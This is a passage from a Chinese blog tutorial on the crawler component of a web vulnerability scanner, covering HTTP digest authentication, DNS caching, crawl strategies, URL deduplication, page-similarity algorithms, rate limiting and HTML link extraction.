透传字段（客户端会原样返回）等， 如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F3.png" alt="此处输入图片的描述"></p><h5 id="2-第二次交互"><a href="#2-第二次交互" class="headerlink" title="2.第二次交互"></a><strong>2.第二次交互</strong></h5><p>此时客户端会将用户名、密码、nonce、HTTP Method 和 URI 作为校验值进行 md5 散列计算，然后通过请求头再次发送给服务端， 服务端认证成功后就会返回如下的正常内容。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F4.png" alt="此处输入图片的描述"></p><p>其中客户端请求头 Authorization 字段中的 response 值为加密后的密码，服务端通过该值来完成认证， 它的生成方式分三步计算：</p><p>(1) 对用户名、认证域 (realm), 以及密码的合并值计算 md5 哈希值， 结果记为 HAI。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F5.png" alt="此处输入图片的描述"></p><p>(2) 对 HTTP 的请求方法， 以及URI的摘要的合并值计算 md5 哈希值， 结果记为 HA2。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F6.png" alt="此处输入图片的描述"></p><p>(3) 按照下面的方式生成 response 值， 如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F7.png" alt="此处输入图片的描述"></p><p>其实，基本式认证和摘要式认证都是比较脆弱的认证方式，它们都无法阻止监听和劫持攻击</p><h3 id="2-HEAD-方法"><a href="#2-HEAD-方法" class="headerlink" title="2.HEAD 方法"></a><strong>2.HEAD 方法</strong></h3><p>HTTP 协议中有很多请求方法， 这里主要说一下HEAD方法。HEAD方法与 GET 方法相同，<strong>只不过服务器响应时不会返回消息体， 只有消息头。</strong></p><blockquote><p><strong>注：</strong><br>这个特性在我门的扫描过程中大有用处，如果阅读过 sqlmap 源码的效果版就知道 sqlmap 中就是通过使用 HEAD头获取页面返回长度而不需要将整个页面返回的，<strong>这样就大大降低了整个扫描对比的时间成本，提高了扫描效率。</strong></p></blockquote><p>下面我们用curl命令发送一个HEAD请求， 举例如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F8.png" alt="此处输入图片的描述"></p><h3 id="3-Cookie-机制"><a href="#3-Cookie-机制" class="headerlink" title="3.Cookie 机制"></a><strong>3.Cookie 机制</strong></h3><p>网站设置的 Cookie，在写爬虫的时候一定要考虑到将其带上，如果有 session 请记得采用未出会话的方式</p><h3 id="4-DNS-本地缓存"><a href="#4-DNS-本地缓存" class="headerlink" title="4. DNS 本地缓存"></a><strong>4. DNS 本地缓存</strong></h3><p>浏览器在与 Web 服务器进行交互时，会向 DNS 服务器发送 DNS 查询，请求查找域名对应的 IP 地址。 在对一个域名进行爬取时， 如果每次都要对域名进行 DNS 查询解析， 就会浪费很多不必要的查询时间， 这时 DNS 缓存的作用就突显出来， <strong>它可以将域名与 IP 对应的关系存储下来</strong>。 当再次去访问这个域名时， 浏览器就会从 DNS 缓存中把 IP 信息取出来， 不再去进行 DNS 查询， 从而提高了页面的访问速度。</p><p><strong>DNS 本地缓存有两种形式：</strong></p><p>(1)一种是浏览器缓存<br>(2)另一种是系统缓存</p><p>在浏览器中访问域名时，它会优先访问浏览器缓存。 一但未命中，则会访问系统缓存。 既然是缓存， 那么就会涉及有效时间。 系统缓存的 DNS 记录有一个 TTL 值 (time to live), 单位是秒， 意思是这个缓存记一个 TTL 值 (time to live), 单位是秒， 意思是这个缓存记录的最大有效时间。 而浏览器缓存的有效时间， 则是由各自厂商单独设置的， 不同种类的浏览 器， 缓存时间不尽相同， 比如： chrome 浏览器的缓存时间大约为 1 分钟。</p><h4 id="1-浏览器缓存"><a href="#1-浏览器缓存" class="headerlink" title="(1)浏览器缓存"></a><strong>(1)浏览器缓存</strong></h4><p><strong>以 chrome 为例：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F9.png" alt="此处输入图片的描述"></p><h4 id="2-系统缓存"><a href="#2-系统缓存" class="headerlink" title="(2)系统缓存"></a><strong>(2)系统缓存</strong></h4><p>Windows 下在 cmd 中输入 ipconfig &#x2F;displaydns 可以查看</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F10.png" alt="此处输入图片的描述"></p><p>Linux 下 使用 nscd -g</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F11.png" alt="此处输入图片的描述"></p><h3 id="5-页面解析"><a href="#5-页面解析" class="headerlink" title="5.页面解析"></a><strong>5.页面解析</strong></h3><p>这里说的页面解析，<strong>主要是指对 HTTP 请求后的响应内容进行页面分析，并从中提取 URL 的过程</strong>。我们知道， HTTP 响应分为响应头和响应体，响应头的内容比较固定，解析也相对简单；而响应体则不一样，它的内容类型多种多样，不同内容的解析方式也不同， 因此需要根据响应体的内容类型来区别对待。</p><p>响应体的内容类型则是由响应头中的” Content-Type” 字段来指定的，它主要用千定义网络文件的类型和网页的编码， 常见的内容类型如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F12.png" alt="此处输入图片的描述"></p><p>本文还是以 HTML 的解析为主</p><h3 id="6-爬虫策略"><a href="#6-爬虫策略" class="headerlink" title="6.爬虫策略"></a><strong>6.爬虫策略</strong></h3><p>爬虫在爬取的过程中会涉及到非常多的不同页面间的互相引用，如果没有一些机制的话就会出现爬取到的页面有很多的重复</p><h4 id="1-广度优先策略"><a href="#1-广度优先策略" class="headerlink" title="(1)广度优先策略"></a><strong>(1)广度优先策略</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F13.png" alt="此处输入图片的描述"></p><h4 id="2-深度优先策略"><a href="#2-深度优先策略" class="headerlink" title="(2)深度优先策略"></a><strong>(2)深度优先策略</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F13.png" alt="此处输入图片的描述"></p><h4 id="3-最佳优先策略-聚焦爬虫策略"><a href="#3-最佳优先策略-聚焦爬虫策略" class="headerlink" title="(3)最佳优先策略(聚焦爬虫策略)"></a><strong>(3)最佳优先策略(聚焦爬虫策略)</strong></h4><p>最佳优先策略，是一种<strong>启发式的爬行策略</strong>。它其实是广度优先策略的一种改进，在广度优先策略的基础上，用一定的网页分析算法，对将要遍历的页面进行评估和筛选，然后选择评估最优的一个或多个页面进行遍历，直至遍历所有的页面为止。</p><blockquote><p><strong>注意：</strong> 在很多情况下， 由于深度优先策略会导致爬虫的 ＂陷入”问题，即无法进行回退遍历，特别是对于大型的互联网网站，通常需要设置爬行的深度，否则爬虫在有限的时间内将无法爬完。 而且在实际的应用中，随着爬行深度的递增，有价值的URL也会相应减少。因此，深度优先策略并不太适用，目前爬虫通常选择的策略是广度优先策略和最佳优先策略。</p></blockquote><h3 id="7-页面跳转"><a href="#7-页面跳转" class="headerlink" title="7.页面跳转"></a><strong>7.页面跳转</strong></h3><p>很多情况下页面会进行跳转，这时候爬虫就要去 follow</p><h4 id="1-客户端跳转"><a href="#1-客户端跳转" class="headerlink" title="(1)客户端跳转"></a><strong>(1)客户端跳转</strong></h4><p>客户端跳转通常也分为两种： 一种是301跳转，<strong>301代表永久性转移</strong>(Permanently Moved)，另一种是302跳转， <strong>302代表临时性跳转</strong>(Temporarily Moved)。 其实301跳转流程与302跳转流程 一样， 只不过状态码不同而已。 </p><p>当客户端向服务端发送一个请求时，服务端会返回一个301或302的跳转响应，客户端浏览器在接收到这个响应后就会发生页面跳转， 它会根据这个响应头中”Location”字段所包含的地址，再次自动向服务端发送一个HTTP请求来完成跳转过程。</p><h4 id="2-服务端跳转"><a href="#2-服务端跳转" class="headerlink" title="(2)服务端跳转"></a><strong>(2)服务端跳转</strong></h4><p>服务端在收到客户端的HTTP请求后，<strong>由于请求的页面和实际处理请求的页面不同</strong>，因此服务端会在内部进行页面跳转，我们称为服务端跳转。在这个过程中，其实服务端只收到客户端的一个HTTP请求，它对客户端来说是透明的，<strong>因此客户端看到的仍然是原始的URL, 响应的状态码也为200。</strong>，这似乎就是我们常见的 PHP 下的 include 的某种操作。</p><p>我们可以在Nginx中增加下面内容：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F15.png" alt="此处输入图片的描述"></p><p>其中，abed.html是客户端发起的请求，而实际服务端处理和响应的是test.html这个页面， 如下图：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F16.png" alt="此处输入图片的描述"></p><blockquote><p><strong>注意：</strong> 服务瑞跳转时，客户端只发送一次请求，浏览器的地址栏不会显示目标地址的URL，而客户端跳转时，由于是两次请求，这时地址栏中会显示目标资源的URL。</p></blockquote><h3 id="8-识别-404-页面"><a href="#8-识别-404-页面" class="headerlink" title="8.识别 404 页面"></a><strong>8.识别 404 页面</strong></h3><p>在爬行的过程中，<strong>爬虫需要识别404错误页面</strong>，并根据它来标记当前所爬行的URL是否有效或存在，这样就可以<strong>避免无效爬取，提高爬虫效率</strong>。 通常管理员在<strong>设置404错误页面时有下面两种情况：</strong></p><p>1.直接在Web容器中设置404错误页面， 此时服务端返回 404状态码</p><p>2.将404错误页面指向一个新的页面， 在页面中使用301或302的方式重定向跳转到这个页面， 此时服务器返回301或302状态码。</p><p>所以从理论上而言， 404错误页面一般返回的状态码为：301、302或404; 但也不排除有的管理员设置特殊， 直接返回状态码为200的错误页面。所以，<strong>对于404错误页面的识别，不能简单根据状态码信息来判断。</strong> 具体的识别方法，后面章节会详细介绍。</p><h3 id="9-URL重复-URL相似-URL包含"><a href="#9-URL重复-URL相似-URL包含" class="headerlink" title="9.URL重复&#x2F;URL相似&#x2F;URL包含"></a><strong>9.URL重复&#x2F;URL相似&#x2F;URL包含</strong></h3><p>这三个概念主要用于爬虫对URL列表进行过滤，过滤掉一些对扫描器没有意义的URL,减少重复爬取的时间，提高扫描器整体的效率。 由于这些名词并不属于标准概念，因此笔者在下面先给出其定义。</p><h4 id="1-URL重复"><a href="#1-URL重复" class="headerlink" title="(1)URL重复"></a><strong>(1)URL重复</strong></h4><p>URL重复，是指<strong>两个URL完全一样</strong>。具体来说，就是协议、主机名、端口、路径、参数名和<strong>参数值</strong>都相同。</p><h4 id="2-URL相似"><a href="#2-URL相似" class="headerlink" title="(2)URL相似"></a><strong>(2)URL相似</strong></h4><p>URL相似，是指两个URL的协议、主机名、端口、路径、参数名和<strong>参数个数</strong>都相同。</p><h4 id="3-URL包含"><a href="#3-URL包含" class="headerlink" title="(3)URL包含"></a><strong>(3)URL包含</strong></h4><p>URL包含，是指两个URL, 将它们分别记为A和B, 它们的协议、主机名、端口和路径都相同。</p><p>若A的参数个数大千或等千B, 那么B的参数名列表与A的参数名列表存在包含关系，其实URL相似可以看作URL包含的一种特例，A和B的参数相同。</p><h3 id="10-区分相似和包含URL的意义"><a href="#10-区分相似和包含URL的意义" class="headerlink" title="10.区分相似和包含URL的意义"></a><strong>10.区分相似和包含URL的意义</strong></h3><p>这里我们结合扫描器的场景来看，扫描器获取这些URL的目的主要是对它们进行安全漏洞审计，而安全漏洞审计的主要方式是<strong>对URL中的参数进行模糊测试</strong>(Fuzz testing)。 </p><p>对于相似的URL检测，其实就是检查服务端上同一个文件的相同参数。 从漏洞检测的角度来看， 如果其中一个 URL 存在漏洞那么相似 URL 也存在漏洞</p><p>包含的URL也是同样的道理， 对千服务端上的同一文件只要检测不同的参数，对于相同的参数无需检查</p><h3 id="11-URL去重"><a href="#11-URL去重" class="headerlink" title="11.URL去重"></a><strong>11.URL去重</strong></h3><p>常见的方式有两种： 布隆过滤器和哈希表去重。</p><h4 id="1-布隆过滤器"><a href="#1-布隆过滤器" class="headerlink" title="(1)布隆过滤器"></a><strong>(1)布隆过滤器</strong></h4><p>布隆过滤器(Bloom-Filter), 是由布隆(Burton Howard Bloom)在1970年提出的。 它实际上是<strong>由一个很长的二进制向量和一系列随机映射函数组成的</strong>，可以用于<strong>检索一个元素是否在一个集合中</strong>。它的优点是空间和查询时间都远远超过一般的算法，缺点是有一定的误识别率和删除困难。 因此，BloomFilter 不适合那些 “零错误” 的应用场合。<strong>而在能容忍低错误率的应用场合下</strong>，BloomFilter 比其他常见的算法（如Hash、折半查找）极大地节省了空间。</p><p><strong>原理如下：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F17.png" alt="此处输入图片的描述"></p><h4 id="2-哈希表去重"><a href="#2-哈希表去重" class="headerlink" title="(2)哈希表去重"></a><strong>(2)哈希表去重</strong></h4><p>哈希表去重的做法比较简单，它通过建立一个哈希表，然后将种子URL放进去. 对于任何一个新的URL.首先它需要在哈希表中进行查找，如果哈希表中不存在，那么就将新的URL插入哈希表中，直至遍历完所有的URL, 最后哈希表中的内容就是去重后的URL。 <strong>这种方式去重效果精确，不会漏掉一个重复的URL, 但对空间的消耗也相应较大。</strong> 根据哈希表存放的位置，可以将其分为两种方式：<strong>一种是基于内存的Hash表去重</strong>；<strong>另一种是基于硬盘的Hash表去重</strong>。</p><h5 id="1-基于内存的Hash表去重"><a href="#1-基于内存的Hash表去重" class="headerlink" title="1.基于内存的Hash表去重"></a><strong>1.基于内存的Hash表去重</strong></h5><p>这种方式直接在内存中对URL进行操作和去重，<strong>随着URL的增长，它消耗的内存空间也越来越多</strong>，然而内存大小是有瓶颈的，因此，<strong>它无法完成对大型网站的全站爬取</strong>。 但由于数据操作是直接在内存中执行的，所以，<strong>它的处理速度很快</strong>。</p><p>在真实的爬取中，由于URL 是字符串形式，占用的字节数较多，按照保守估计，每个URL平均的长度为20 ,当然，URL越长占用的空间也就越大。这种情况下我们可以进行简单的优化，对URL进行压缩存储。</p><p>以md5哈希算法为例，md5运算后的结果是 128bit, 也就是16字节的长度，而且每个URL的长度都可以控制在16字节，这样就可以极人地减少存储空间的开销。</p><p>具体的操作方式为：<strong>对URL进行哈希运算，然后放到这个哈希表中</strong>，如果哈希值不存在千哈希表中， 就将该URL插入结果列表， 同时将哈希值插入哈希表， 直至遍历结束， 此时结果列表中就是去重后的URL。</p><h5 id="2-基于硬盘的Hash表去重"><a href="#2-基于硬盘的Hash表去重" class="headerlink" title="2.基于硬盘的Hash表去重"></a><strong>2.基于硬盘的Hash表去重</strong></h5><p>它将URL存储在硬盘上，并在硬盘上对其进行去重。这样在处理海量URL的时候，就不用担心内存溢出的问题。这种方式有个成熟的解决方案，就是利用Berkeley DB进行基于硬盘的URL去重。</p><p>Berkeley DB是一个开源的文件数据库， 介于关系数据库与内存数据库之间， 使用方式与内存数据库类似， <strong>它提供的是一系列直接访问数据库的函数， 是一个高性能的嵌入式数据库引擎，可以用来保存任意类型的键／值对(KeyNalue) , 而且可以为一个键值保存多个数据。</strong> </p><p>它支持数千个并发线程同时操作数据库，支待最大256TB的数据。 同时提供诸如C语言、C++、Java、Perl、Python等多种编程语言的API. 并且广泛支持大多数类Unix操作系统、Windows操作系统，以及实时操作系统（如：VxWorks)。</p><p>Berkeley DB实际是一个在硬盘上的 hash 表，我们可以使用压缩后的URL字符串作为Key,而对于Value可以使用Boolean,一个字节；实际上，Value是 个状态标识， 减少Value占用存储空间， 然后直接向Berkeley DB添加URL即可。 当遇到重复的URL时， 它就会通过返回值告知我们。</p><h3 id="12-页面相似算法"><a href="#12-页面相似算法" class="headerlink" title="12.页面相似算法"></a><strong>12.页面相似算法</strong></h3><p>在一些情况中，比如SQL注入检测，我们通常需要比较两个页面内容的关系，看看他们是否相似或相同，然后利用它们的差异性来判断输入对后端应用的影响。页面相这里主要介绍其中常用的两种： <strong>编辑距离和Simhash</strong></p><h4 id="1-编辑距离"><a href="#1-编辑距离" class="headerlink" title="1.编辑距离"></a><strong>1.编辑距离</strong></h4><p>它是指两个字符串之间，由一个转成另一个所需的最少编辑次数，许可的方式是：插入、删除、替换。编辑距离的算法由俄国科学家Levenshtein提出，所以叫LevenshteinDistance。 一般来说，编辑距离越小，两个串的相似度越大。</p><h4 id="2-Simhash"><a href="#2-Simhash" class="headerlink" title="2.Simhash"></a><strong>2.Simhash</strong></h4><p>Simhash是Google用来处理海量文本去重的算法，它会为每一个Web文档通过Hash的方式生成一个64位的字节指纹，暂目称之为 “特征字 “，判断相似度时**，只需判断特征字的海明距离是不是小于n (根据经验值，n一般取值为3)**’ 就可判断两个文档是否相似。</p><p>那么，什么叫海明距离呢？在信息编码中， 两个合法代码对应位上编码不同的位数称为码距，又称海明距离。</p><p><strong>举例如下：</strong><br>10101 和 00110 从第一位开始依次有第一位， 第四位和第五位不同，则海明距离为3</p><blockquote><p>这里其实我还是有一个疑问，因为 hash 是杂凑函数，也就是页面只要改变一点点 hash就会变得完全不同，这就是所谓的雪崩效应，所以我不知道他是怎么做到小于 3 的</p></blockquote><h3 id="13-断连重试"><a href="#13-断连重试" class="headerlink" title="13.断连重试"></a><strong>13.断连重试</strong></h3><p>在爬虫的爬行过程中，为了保证爬虫的稳定和健壮，必须要考虑网络抖动的因素。因此，我们需要增加断连重试机制。当连接断开时，爬虫需要尝试去重新建立新的连接，只有当连接断开的次数超过阀值时，才会认定当前的网络不可用。</p><h3 id="14-动态链接与静态链接"><a href="#14-动态链接与静态链接" class="headerlink" title="14.动态链接与静态链接"></a><strong>14.动态链接与静态链接</strong></h3><p>这里所说的动态链接和静态链接，主要是针对URL而言的 它们可以通过URL的扩展名来区分。<strong>静态链接主要是指静态资源文件</strong>，扩展名主要为： rar、 zip、 ttf、 png、 gif等。 因为<strong>它们对获取新的URL并没有做出太多贡献</strong>，而且这类链接的数量又非常大， 因此，<strong>我们需要在新一轮爬取前过滤这些无意义的静态链接， 这样就可以极大地提高爬行效率</strong>。</p><p><strong>动态链接与静态链接是相反的</strong>，它所代表的页面中包含新的URL. <strong>我们需要对其进行页面解析和URL提取操作</strong>， 这类链接的扩展名主要为： html 、 shtml、 do、 asp、 aspx、 php、 jsp等</p><h2 id="0X03-web-爬虫进阶"><a href="#0X03-web-爬虫进阶" class="headerlink" title="0X03 web 爬虫进阶"></a><strong>0X03 web 爬虫进阶</strong></h2><h3 id="1-web-爬虫的工作原理"><a href="#1-web-爬虫的工作原理" class="headerlink" title="1.web 爬虫的工作原理"></a><strong>1.web 爬虫的工作原理</strong></h3><p>Web爬虫，即从一个或若干个<strong>初始网页的URL开始</strong>，获得初始网页上的URL, 在抓取网页的过程中**，不断从当前页面上抽取新的URL放入队列**，直到满足一定的条件才会停止爬取。</p><p>从上面这段话可以看到，<strong>爬虫的工作原理其实很简单</strong>，根据内容定义可以很容易地给出Web爬虫的框架代码(Python版本），如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F18.png" alt="此处输入图片的描述"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F20.png" alt="此处输入图片的描述"></p><h3 id="2-实现-URL-的封装"><a href="#2-实现-URL-的封装" class="headerlink" title="2.实现 URL 的封装"></a><strong>2.实现 URL 的封装</strong></h3><p>由于在爬取的过程中，爬虫不仅需要对URL进行频繁操作和处理，同<strong>时还需要获取URL 中的很多元信息</strong>，比如， 主机名、端口、根域名、文件名、扩展名和请求参数等。 因此，在这里我们<strong>需要对URL进行类封装</strong>， 这样可以方便后续对其进行统一的维护和改进。</p><p>在URL类中， 主要通过Python自带的URL解析模块(urlparse)来获取URL相关的属性信息， 部分实现代码如下：</p><p><strong>URL 类：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F22.png" alt="此处输入图片的描述"></p><p><strong>URL 类方法：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F23.png" alt="此处输入图片的描述"></p><p>然后我们就可调用这个类的方法去获取地址的各种部分了</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F24.png" alt="此处输入图片的描述"></p><h3 id="3-HTTP-的请求和响应"><a href="#3-HTTP-的请求和响应" class="headerlink" title="3.HTTP 的请求和响应"></a><strong>3.HTTP 的请求和响应</strong></h3><p>我们的爬虫最基本的功能就是去请求页面然后获取页面的响应，为了方便我们依然对其进行封装</p><h4 id="1-Request-类"><a href="#1-Request-类" class="headerlink" title="(1)Request 类"></a><strong>(1)Request 类</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F25.png" alt="此处输入图片的描述"></p><h4 id="2-Response-类"><a href="#2-Response-类" class="headerlink" title="(2)Response 类"></a><strong>(2)Response 类</strong></h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F26.png" alt="此处输入图片的描述"></p><h4 id="3-wCurl-类"><a href="#3-wCurl-类" class="headerlink" title="(3)wCurl 类"></a><strong>(3)wCurl 类</strong></h4><p>具体的请求和响应我们使用的是 wCurl 类来实现， wCurl 是一个基千 Requests 模块的二次封装， </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F28.png" alt="此处输入图片的描述"></p><h4 id="4-查询-dns-缓存"><a href="#4-查询-dns-缓存" class="headerlink" title="(4)查询 dns 缓存"></a><strong>(4)查询 dns 缓存</strong></h4><p>在 URL 爬取过程中，为了减少频繁地对域名进行 DNS 查询，我们可以根据本地缓存 DNS的查询结果进行优化。如果该域名已经查询过，那么就直接返回DNS查询结果，而不必向DNS服务器发送查询请求。 只有当该域名还没有被查询过的时候， 才会进行DNS查询， 并记录域名到IP的对应关系。 具体的代码实现如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F29.png" alt="此处输入图片的描述"></p><h4 id="5-扫描速率控制"><a href="#5-扫描速率控制" class="headerlink" title="(5)扫描速率控制"></a><strong>(5)扫描速率控制</strong></h4><p><strong>扫描速率的控制有两种方法实现：</strong></p><p>1.是将需要发送的请求全部存入队列，然后新起一个线程，每隔一段时间从队列中取出一个请求进行发送，并对响应进行处理</p><p>2.使用 HOOK 的方式行处理，对socket中的connect函数进行HOOK,在<strong>请求发送之前进行时间间隔的统一控制</strong>和处理，从而实现扫描速率的控制。</p><p>由于HOOK的方式便于理解和操作，因此，这里就以HOOK方式来实现。在对connect函数进行HOOK之前，先举个例子， 便于读者理解。下面有个函数show() , 对其进行HOOK,在函数show()运行之前，打印出当前的时间，由于该例子用到Python 中的apply函数， 这里先介绍一下该函数的用法。</p><p>apply(func[,args [,kwargs]])函数用于当函数参数已经存在于一个元组或字典中时，间接地调用函数。args是个包含将要提供给函数的按位置传递的参数的元组。举例说明一下，假如函数A的位置为A(a&#x3D; l,b&#x3D;2) ,那么这个元组中就必须严格按照这个参数的位置顺序(a&#x3D;3,b&#x3D;4)进行传递，而不能是(b&#x3D;4,a&#x3D;3)这样的顺序。kwargs是个包含关键字参数的字典， 如果args不需要传递，kwargs需要传递，那么必须在args的位置留空，apply的返回值就是func函数的返回值。 如果直接省略了args, 那么任何参数都不会被传递。</p><p>下面我们来看看如何 利用apply函数进行HOOK操作， 代码实现如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F30.png" alt="此处输入图片的描述"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F31.png" alt="此处输入图片的描述"></p><p>具体实现如下</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F32.png" alt="此处输入图片的描述"></p><h3 id="4-页面解析"><a href="#4-页面解析" class="headerlink" title="4.页面解析"></a><strong>4.页面解析</strong></h3><h4 id="1-HTML-解析库"><a href="#1-HTML-解析库" class="headerlink" title="(1)HTML 解析库"></a><strong>(1)HTML 解析库</strong></h4><p>在 Python 环境中，常用的 HTML 解析库有 HTMLParser、 lxml 和 html5lib 等，可以使用它 们进行页面解析和 URL提取，其各自的特点如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F33.png" alt="此处输入图片的描述"></p><h5 id="1-HTMLParser"><a href="#1-HTMLParser" class="headerlink" title="1.HTMLParser"></a><strong>1.HTMLParser</strong></h5><p>它是Python中内置的用来<strong>解析HTML的模块</strong>，可以分析出HTML里面的标签、数据等,通过HTMLParser处理HTML非常简便。 HTMLParser采用的是一种事件驱动的模式， <strong>当HTMLParser找到一个特定的标记的时候就会调用用户自定义的函数</strong>，并以此来通知程序处理，其中<strong>用户定义的回调函数都是以handler_开头命名的</strong>。</p><h5 id="2-lxml"><a href="#2-lxml" class="headerlink" title="2.lxml"></a><strong>2.lxml</strong></h5><p>lxml 是Python处理XML和HTML相关功能最丰富和最容易使用的库。lxml是libxml2和libxslt 库的一个Python化的绑定。它与众不同的地方是兼顾了这些库的速度和功能的完整性，以及纯PythonAPI的简洁性。由于爬虫通常需要处理的页面很多， 所以这里我们选择速度快和容错能力强的lxml库对HTML进行解析。</p><h5 id="3-html5lib"><a href="#3-html5lib" class="headerlink" title="3.html5lib"></a><strong>3.html5lib</strong></h5><p>html5lib是一个通过Ruby和Python解析HTML文档的类库，支待HTML5并最大程度兼容桌面浏览器。在页面解析中，我们而要处理两个主要问题：一个是URL提取：另一个是自动填表。也就是说，当碰到页面中有FORM表单时， 需要完成对表单内容的自动填充，然后再发送给服务端。</p><h4 id="2-URL-提取"><a href="#2-URL-提取" class="headerlink" title="(2)URL 提取"></a><strong>(2)URL 提取</strong></h4><p>URL提取来源于HTTP响应头和HTTP响应体。</p><h5 id="1-HTTP响应头"><a href="#1-HTTP响应头" class="headerlink" title="1.HTTP响应头"></a><strong>1.HTTP响应头</strong></h5><p>当响应的状态码为301或302时，响应头中会有Location字段，它的值中会有URL信息，如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F34.png" alt="此处输入图片的描述"></p><p>当然可能还会有一些其他自定义字段包含URL 信息，所以需要从HTTP 响应头中提取URL</p><h5 id="2-HTTP响应体"><a href="#2-HTTP响应体" class="headerlink" title="2.HTTP响应体"></a><strong>2.HTTP响应体</strong></h5><p><strong>响应体中的URL 提取比较简单， 这里有两种常用的方式：</strong> </p><p>(1)利用<strong>URL正则对响应体的内容进行全文匹配</strong>，找出其中所有的URL信息；<br>(2)对HTML 进行解析，<strong>遍历存在URL的标签</strong>，如：超链接标签<code>&lt;a&gt;</code>、表单标签<code>&lt;form&gt;</code>和脚本标签<code>&lt;script&gt;</code>等，获取这些标签的属性值即可。</p><p><strong>利弊分析：</strong></p><p>(1)第一种方式由于是通过正则匹配来获取，URL 的准确度较差，只能够获取一些标准格式的URL:<br>(2)第二种方式是通过标签的属性值来获取URL, 理论上准确度会高些， 但可能会漏掉页面的一些URL。因此， 这里面结合两种方式来提取URL。</p><p>下面就利用lxml 的HTML解析器来对HTTP 响应进行解析并提取其中的URL 信息。HTML解析器在对HTML文档解析中会隐式触发一些函数， 比如，当解析器遇到HTML 标签调用时，如： <code>&lt;a href=&quot;http://www.baidu.com&quot;&gt;</code>, 就会调用函数<code>handle_a_tag_start(tag,attrs)</code>, 其中参数tag 是标签名，attrs 为标签所有的属性，并按照(name,value) 的元组以列表形式存储，这里attrs 值为： <code>[(&#39;href&#39;,&#39;http://www.baidu.com&#39;)]</code> ,当遇到对应结束标签时，如： <code>&lt;/a&gt;</code>, 